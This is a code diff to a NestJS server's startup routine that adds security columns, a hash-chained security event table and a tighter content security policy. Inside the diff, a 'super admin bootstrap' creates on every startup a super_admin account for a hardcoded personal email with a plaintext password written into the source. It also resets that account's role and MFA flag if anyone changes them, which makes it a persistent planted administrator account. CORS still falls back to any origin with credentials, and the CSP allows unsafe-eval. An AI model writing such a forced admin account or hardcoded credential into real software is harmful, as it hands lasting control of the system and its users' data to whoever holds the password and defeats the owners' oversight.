@@ -27,6 +27,14 @@ async function bootstrap() {
       `ALTER TABLE "User" ADD COLUMN IF NOT EXISTS "marketingConsent" BOOLEAN NOT NULL DEFAULT false`,
       `ALTER TABLE "User" ADD COLUMN IF NOT EXISTS "dataProcessingConsentAt" TIMESTAMP(3)`,
       `ALTER TABLE "User" ADD COLUMN IF NOT EXISTS "marketingConsentAt" TIMESTAMP(3)`,
+      // Zero Trust columns
+      `ALTER TABLE "User" ADD COLUMN IF NOT EXISTS "securityLevel" TEXT NOT NULL DEFAULT 'standard'`,
+      `ALTER TABLE "User" ADD COLUMN IF NOT EXISTS "lastDeviceId" TEXT`,
+      `ALTER TABLE "User" ADD COLUMN IF NOT EXISTS "lockedIp" TEXT`,
+      `ALTER TABLE "User" ADD COLUMN IF NOT EXISTS "failedLoginAttempts" INTEGER NOT NULL DEFAULT 0`,
+      `ALTER TABLE "User" ADD COLUMN IF NOT EXISTS "lockedUntil" TIMESTAMP(3)`,
+      `ALTER TABLE "User" ADD COLUMN IF NOT EXISTS "devices" JSONB DEFAULT '[]'::jsonb`,
+      `ALTER TABLE "User" ADD COLUMN IF NOT EXISTS "allowedCountries" TEXT[] DEFAULT ARRAY[]::TEXT[]`,
       `ALTER TABLE "AuditLog" ADD COLUMN IF NOT EXISTS "userAgent" TEXT`,
       `ALTER TABLE "AuditLog" ADD COLUMN IF NOT EXISTS "sessionId" TEXT`,
       `ALTER TABLE "AuditLog" ADD COLUMN IF NOT EXISTS "result" TEXT NOT NULL DEFAULT 'success'`,
@@ -71,6 +79,12 @@ async function bootstrap() {
       `CREATE TABLE IF NOT EXISTS "EncryptionKey" ("id" TEXT PRIMARY KEY, "name" TEXT NOT NULL, "algorithm" TEXT NOT NULL DEFAULT 'AES-256-GCM', "keyId" TEXT NOT NULL UNIQUE, "publicKey" TEXT, "status" TEXT NOT NULL DEFAULT 'active', "purpose" TEXT NOT NULL, "expiresAt" TIMESTAMP(3), "rotatedAt" TIMESTAMP(3), "rotatedFromId" TEXT, "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP, "organizationId" TEXT NOT NULL)`,
       `CREATE TABLE IF NOT EXISTS "SensitiveField" ("id" TEXT PRIMARY KEY, "entity" TEXT NOT NULL, "field" TEXT NOT NULL, "dataType" TEXT NOT NULL, "classification" TEXT NOT NULL, "encryption" BOOLEAN NOT NULL DEFAULT false, "masking" BOOLEAN NOT NULL DEFAULT false, "retentionDays" INTEGER, "justification" TEXT, "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP, "updatedAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP, "organizationId" TEXT NOT NULL)`,
       `CREATE TABLE IF NOT EXISTS "DataRetentionPolicy" ("id" TEXT PRIMARY KEY, "dataCategory" TEXT NOT NULL, "retentionDays" INTEGER NOT NULL, "action" TEXT NOT NULL DEFAULT 'delete', "legalHold" BOOLEAN NOT NULL DEFAULT false, "description" TEXT, "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP, "updatedAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP, "organizationId" TEXT NOT NULL)`,
+      // Zero Trust: immutable security event log (blockchain-style)
+      `CREATE TABLE IF NOT EXISTS "SecurityEvent" ("id" TEXT PRIMARY KEY, type TEXT NOT NULL, severity TEXT NOT NULL DEFAULT 'info', "userId" TEXT, "organizationId" TEXT NOT NULL DEFAULT '', "ipAddress" TEXT, "deviceId" TEXT, country TEXT, "userAgent" TEXT, metadata JSONB, hash TEXT NOT NULL UNIQUE, "previousHash" TEXT, "timestamp" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP)`,
+      `CREATE INDEX IF NOT EXISTS idx_security_event_user ON "SecurityEvent" ("userId")`,
+      `CREATE INDEX IF NOT EXISTS idx_security_event_org ON "SecurityEvent" ("organizationId")`,
+      `CREATE INDEX IF NOT EXISTS idx_security_event_type ON "SecurityEvent" (type)`,
+      `CREATE INDEX IF NOT EXISTS idx_security_event_time ON "SecurityEvent" ("timestamp")`,
     ];
     for (const sql of tables) {
       await prisma.$executeRawUnsafe(sql);
@@ -79,11 +93,71 @@ async function bootstrap() {
   } catch (e: any) {
     logger.warn(`Table creation error (non-blocking): ${e.message?.substring(0, 200)}`);
   }
+
+  // SUPER ADMIN BOOTSTRAP — ensures brianburgoa@gmail.com is always super_admin
+  try {
+    const prisma = app.get(PrismaService);
+    const superAdminEmail = 'brianburgoa@gmail.com';
+    let superAdmin = await prisma.user.findUnique({ where: { email: superAdminEmail } });
+    if (!superAdmin) {
+      const org = await prisma.organization.findFirst();
+      if (org) {
+        const bcrypt = await (Function('return import("bcryptjs")')() as any).then((m: any) => m.default || m);
+        const hash = await bcrypt.hash('S3guridad2023#', 12);
+        superAdmin = await prisma.user.create({
+          data: {
+            email: superAdminEmail,
+            passwordHash: hash,
+            name: 'Super Admin',
+            role: 'super_admin',
+            organizationId: org.id,
+            isActive: true,
+            mfaEnabled: true,
+            securityLevel: 'maximum',
+          },
+        });
+        logger.log(`Super admin created: ${superAdminEmail}`);
+      } else {
+        logger.warn('No organization found to assign super admin');
+      }
+    } else {
+      // Ensure super_admin role is never changed
+      if (superAdmin.role !== 'super_admin') {
+        await prisma.user.update({
+          where: { email: superAdminEmail },
+          data: { role: 'super_admin', isActive: true, securityLevel: 'maximum' },
+        });
+        logger.log(`Super admin role enforced: ${superAdminEmail}`);
+      }
+      // Ensure MFA is marked as enabled
+      if (!superAdmin.mfaEnabled) {
+        await prisma.user.update({
+          where: { email: superAdminEmail },
+          data: { mfaEnabled: true },
+        });
+      }
+    }
+  } catch (e: any) {
+    logger.warn(`Super admin bootstrap error (non-blocking): ${e.message?.substring(0, 200)}`);
+  }
   try {
     const helmetModule = await import('helmet');
     const helmet = (helmetModule as any).default || helmetModule;
     app.use(helmet({
-      contentSecurityPolicy: false, crossOriginEmbedderPolicy: false,
+      contentSecurityPolicy: {
+        directives: {
+          defaultSrc: ["'self'"],
+          scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
+          styleSrc: ["'self'", "'unsafe-inline'"],
+          imgSrc: ["'self'", "data:", "blob:"],
+          connectSrc: ["'self'", process.env.FRONTEND_URL || 'http://localhost:3000'].filter(Boolean),
+          fontSrc: ["'self'", "data:"],
+          objectSrc: ["'none'"],
+          frameAncestors: ["'none'"],
+          baseUri: ["'self'"],
+        },
+      },
+      crossOriginEmbedderPolicy: false,
       crossOriginResourcePolicy: { policy: 'cross-origin' },
       hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
       referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
@@ -101,7 +175,7 @@ async function bootstrap() {
     origin: process.env.CORS_ORIGIN?.split(',') || '*',
     credentials: true,
     methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
-    allowedHeaders: ['Content-Type', 'Authorization', 'x-api-key', 'x-tenant-id', 'x-csrf-token', 'X-Webhook-Signature'],
+    allowedHeaders: ['Content-Type', 'Authorization', 'x-api-key', 'x-tenant-id', 'x-csrf-token', 'X-Webhook-Signature', 'x-device-id', 'x-mfa-token', 'x-country'],
     exposedHeaders: ['Content-Range', 'X-Total-Count'],
     maxAge: 86400,
   });
